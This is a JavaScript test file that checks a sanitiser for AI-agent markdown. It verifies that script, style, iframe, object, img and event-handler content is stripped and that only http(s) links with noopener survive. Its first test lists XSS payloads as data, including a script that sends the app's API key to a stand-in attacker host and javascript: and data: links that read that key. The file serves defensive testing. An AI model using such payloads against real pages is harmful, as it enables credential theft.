import { expect, test } from 'bun:test';
import { Window } from 'happy-dom';

import { renderAgentMarkdown } from './markdown.mjs';

const window = new Window({ url: 'file:///Applications/index.app/Contents/Resources/index.html' });
window.SyntaxError = SyntaxError;
const markedSource = await Bun.file(new URL('../IndexApp/src/vendor/marked.umd.js', import.meta.url)).text();
const marked = new Function('globalThis', `${markedSource}\nreturn globalThis.marked;`)(window);

function render(markdown) {
  return renderAgentMarkdown(marked, window.DOMParser, markdown);
}

test('model markdown cannot create active content or credential-reading attributes', () => {
  const malicious = [
    '<script>fetch(`https://attacker.invalid/${window.INDEX_NATIVE.apiKey}`)</script>',
    '<style>body{display:none}</style><iframe src="data:text/html,steal"></iframe>',
    '<object data="https://attacker.invalid"></object>',
    '<img src=x onerror="window.stolen=INDEX_NATIVE.apiKey">',
    '[run](javascript:window.stolen=INDEX_NATIVE.apiKey)',
    '[data](data:text/html,<script>window.stolen=INDEX_NATIVE.apiKey</script>)',
  ].join('\n\n');
  const html = render(malicious);
  expect(html).not.toMatch(/<(?:script|style|iframe|object|img)\b/i);
  expect(html).not.toContain('href=');
  expect(html).toContain('&lt;script&gt;');

  const host = window.document.createElement('div');
  window.INDEX_NATIVE = { apiKey: 'must-not-be-read' };
  window.stolen = null;
  host.innerHTML = html;
  window.document.body.append(host);
  expect(host.querySelectorAll('script,style,iframe,object,img,a')).toHaveLength(0);
  for (const element of host.querySelectorAll('*')) {
    expect([...element.attributes].some((attribute) => /^on/i.test(attribute.name))).toBe(false);
  }
  expect(window.stolen).toBeNull();
});

test('only normalized http(s) links survive and are marked for external opening', () => {
  const html = render('[secure](https://example.test/a?q=1) [plain](http://example.test/b) [relative](/inside)');
  const host = window.document.createElement('div');
  host.innerHTML = html;
  const links = [...host.querySelectorAll('a')];
  expect(links.map((link) => link.href)).toEqual([
    'https://example.test/a?q=1',
    'http://example.test/b',
  ]);
  for (const link of links) {
    expect(link.target).toBe('_blank');
    expect(link.rel).toBe('noopener noreferrer');
    expect([...link.attributes].map((attribute) => attribute.name).sort()).toEqual(['href', 'rel', 'target']);
  }
  expect(host.textContent).toContain('relative');
});
